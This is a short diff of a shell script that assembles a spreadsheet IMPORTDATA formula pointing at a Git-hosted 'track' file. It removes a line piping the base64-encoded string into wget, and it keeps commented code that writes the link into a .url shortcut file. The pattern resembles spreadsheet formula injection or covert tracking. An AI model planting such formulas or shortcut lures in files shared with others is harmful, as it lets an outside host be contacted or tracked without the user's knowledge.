@@ -131,7 +131,7 @@ linkPost=`echo Item ID==IMPORTDATA\(\"`$linkGit`echo track-Hiep-usItemId-CO.txt\
 `
 
 echo $linkApi + $linkPost
-echo -n $linkPost + $linkPost | base64 | wget -i -
+echo -n $linkPost | base64
 
 # echo '[InternetShortcut]
 # URL='$linkPost'' > track-Hiep.url
